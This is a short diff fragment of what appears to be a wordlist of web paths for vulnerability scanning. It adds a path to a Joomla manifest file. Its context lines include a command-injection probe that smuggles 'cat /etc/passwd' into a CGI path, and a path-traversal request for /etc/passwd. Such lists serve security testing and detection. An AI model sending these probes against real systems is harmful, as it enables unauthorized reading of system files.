@@ -9,3 +9,4 @@
 /cgi-bin/;cat$IFS/etc/passwd
 /servlets/FetchFile?fileName=../../../etc/passwd
 /command/prima-factory.cgi
+/administrator/manifests/files/joomla.xml
